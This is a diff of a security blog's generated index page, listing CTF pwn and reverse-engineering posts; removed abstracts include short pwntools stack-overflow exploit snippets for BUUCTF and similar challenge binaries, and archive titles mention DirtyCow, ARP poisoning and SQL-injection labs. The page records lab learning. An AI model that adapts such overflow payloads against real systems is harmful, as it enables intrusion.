@@ -346,85 +346,6 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href="/2020/03/15/BUUCTF_pwn_writeup/">
-            
-                <span>[Untitled Post]</span>
-        </a>
-        <div class="abstract-content">
-            1.test_your_nc直接使用nc命令即可，本来还以为会有欢迎页面什么的，结果就是黑屏直接输入命令
-2.rip简单的栈溢出12345678from pwn import *p = process('./pwn1')#p = remote("node3.buuoj.cn",27060)payload = "a"*15+"BBBBBBBB"+p64(0x040118a)p.sendline(payload)p.interactive()
-3.warmup_csaw_2016简单的栈溢出，将返回地址改成上面这个函数就行12345678from pwn import *sh = proce...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/15</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2020/03/14/ctfhub_pwn刷题WP/">
-            
-                <span>[Untitled Post]</span>
-        </a>
-        <div class="abstract-content">
-            from pwn import *import sys, oscontext(arch=’amd64’, os=’linux’, log_level=’info’)
-if len(sys.argv) &gt; 1:    if sys.argv[1][0] == ‘r’:   # remote        p = remote(‘178.62.249.106’, 8642)else:    os.environ[‘LD_PRELOAD’] = ‘’    p = process(‘./mrs._hudson’)
-libc = ELF(‘.’)elf = ELF(‘.’)payload ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/14</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2020/03/11/Pwnable.kr详解/">
-            
-                <span>[Untitled Post]</span>
-        </a>
-        <div class="abstract-content">
-            在网上发现了一个pwn的题库，页面非常的可爱，所以就做了下，在这里记录下做题的过程。题目网址是：http://pwnable.kr/play.php页面是不是非常可爱
-Toddler’s Bottlefd首先是第一题，和文件描述符有关
-文件描述符Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。
-特点
-每个文件描述符会与一个打开的文件相对应
-不同的文件描述符也可能指向同一个文件
-相同的文件可以被不同的进程打开...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/11</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
         <a class="abstract-title" href="/2020/03/05/SQL词义分析(状态自动机)/">
             
                 <span>[Untitled Post]</span>
@@ -466,36 +387,6 @@ Toddler’s Bottlefd首先是第一题，和文件描述符有关
             <!-- date  -->
             <div class="abstract-date">
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/04</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2020/03/02/how2heap/">
-            
-                <span>[Untitled Post]</span>
-        </a>
-        <div class="abstract-content">
-            how2heap总结题目地址：https://github.com/shellphish/how2heap
-实验环境：
-
-Ubuntu 16.04
-git clone上面的链接里的文件，直接在文件夹里执行make命令
-
-malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr。printf是标准输出函数，也就是输出到屏幕上的，fprintf是输出到流的，stdout标准输出、stderr标准错误输出，二者默认向屏幕输出。如果重定向输出到磁盘文件，则stdout输出到该文件，而stderr仍输出到屏幕。
-1intptr_t arg1, arg...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/02</span>
             </div>
             <!-- tags  -->
             
@@ -1134,142 +1025,9 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 45
+        Total : 40
         </div>
         <!-- search  -->
         
@@ -1285,17 +1043,17 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span><a class="archive-post-title" href="/2020/03/15/BUUCTF_pwn_writeup/">[Untitled Post]</a>
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/pwnable-kr-WriteUp/">pwnable.kr WriteUp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/14</span><a class="archive-post-title" href="/2020/03/14/ctfhub_pwn刷题WP/">[Untitled Post]</a>
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/BUUCTF刷题记录/">BUUCTF刷题记录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/11</span><a class="archive-post-title" href="/2020/03/11/Pwnable.kr详解/">[Untitled Post]</a>
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/HITCON-Training-Writeup/">HITCON-Training-Writeup</a>
         </li>
     
     
@@ -1306,21 +1064,6 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/Mikrotik Chimay-Red 分析/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2020/03/02/how2heap/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/09</span><a class="archive-post-title" href="/2020/02/09/HITCON Training Writeup/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/07</span><a class="archive-post-title" href="/2020/02/07/pwnxyz/">[Untitled Post]</a>
         </li>
     
     
@@ -1336,11 +1079,6 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/11</span><a class="archive-post-title" href="/2019/12/11/HITCON-Trainging-lab13/">HITCON Trainging lab13详解</a>
-        </li>
     
     
         <li class="archive-post-item">
@@ -1370,11 +1108,6 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/2019/10/17/堆的分配原理分析/">堆的分配原理分析</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/14</span><a class="archive-post-title" href="/2019/10/14/ucore-lab0,lab1/">ucore_lab0,lab1</a>
         </li>
     
     
@@ -1479,12 +1212,12 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/自己动手写工具(2)--TCP代理/">自己动手写工具(2)--TCP代理</a>
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/自己动手写工具(2)--TCP代理/">自己动手写工具(2)--TCP代理</a>
         </li>
     
     
@@ -1504,12 +1237,12 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/sqli-labs/">sqli-labs 通关详解</a>
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/python下多核/">python下多核，单核CPU对于并行，并发执行效率的对比</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/python下多核/">python下多核，单核CPU对于并行，并发执行效率的对比</a>
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/sqli-labs/">sqli-labs 通关详解</a>
         </li>
     
     
@@ -1522,6 +1255,8 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
+    
         <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
     
         <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
@@ -1529,10 +1264,6 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
         <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
     
         <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
-    
-        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
-    
-        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
     
         <span class="sidebar-tag-name" data-tags="powerpc,汇编"><span class="iconfont-archer">&#xe606;</span>powerpc,汇编</span>
     
@@ -1544,25 +1275,27 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
         <span class="sidebar-tag-name" data-tags="信息收集,社会工程学"><span class="iconfont-archer">&#xe606;</span>信息收集,社会工程学</span>
     
+        <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
+    
         <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
     
         <span class="sidebar-tag-name" data-tags="PWN,BROP,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,BROP,栈溢出</span>
     
-        <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
+        <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
     
         <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
     
-        <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
-    
-        <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
+        <span class="sidebar-tag-name" data-tags="工具,python,proxy"><span class="iconfont-archer">&#xe606;</span>工具,python,proxy</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
     
-        <span class="sidebar-tag-name" data-tags="工具,python,proxy"><span class="iconfont-archer">&#xe606;</span>工具,python,proxy</span>
+        <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
     
         <span class="sidebar-tag-name" data-tags="栈溢出,PWN"><span class="iconfont-archer">&#xe606;</span>栈溢出,PWN</span>
     
         <span class="sidebar-tag-name" data-tags="CCProxy,栈溢出,pwn"><span class="iconfont-archer">&#xe606;</span>CCProxy,栈溢出,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
     
         <span class="sidebar-tag-name" data-tags="unlink,heap,pwn,Android"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn,Android</span>
     
@@ -1576,6 +1309,8 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
     
         <span class="sidebar-tag-name" data-tags="工具,python,arp_poison"><span class="iconfont-archer">&#xe606;</span>工具,python,arp_poison</span>
     
+        <span class="sidebar-tag-name" data-tags="unlink,heap,pwn"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf,web,sql注入"><span class="iconfont-archer">&#xe606;</span>ctf,web,sql注入</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,Format String Vulnerability"><span class="iconfont-archer">&#xe606;</span>pwn,Format String Vulnerability</span>
@@ -1585,8 +1320,6 @@ malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr
         <span class="sidebar-tag-name" data-tags="windows,影子账户"><span class="iconfont-archer">&#xe606;</span>windows,影子账户</span>
     
         <span class="sidebar-tag-name" data-tags="Linux,DirtyCow"><span class="iconfont-archer">&#xe606;</span>Linux,DirtyCow</span>
-    
-        <span class="sidebar-tag-name" data-tags="ucore,lab0,lab1"><span class="iconfont-archer">&#xe606;</span>ucore,lab0,lab1</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,堆,glibc"><span class="iconfont-archer">&#xe606;</span>pwn,堆,glibc</span>
     
@@ -1623,15 +1356,13 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
         <span class="sidebar-category-name" data-categories="ACM"><span class="iconfont-archer">&#xe60a;</span>ACM</span>
     
         <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
     
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
-    
-        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
-    
-        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
     
         <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
@@ -1640,6 +1371,8 @@ jsonContent:
         <span class="sidebar-category-name" data-categories="Pwn"><span class="iconfont-archer">&#xe60a;</span>Pwn</span>
     
         <span class="sidebar-category-name" data-categories="BlackHatTools"><span class="iconfont-archer">&#xe60a;</span>BlackHatTools</span>
+    
+        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
     
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
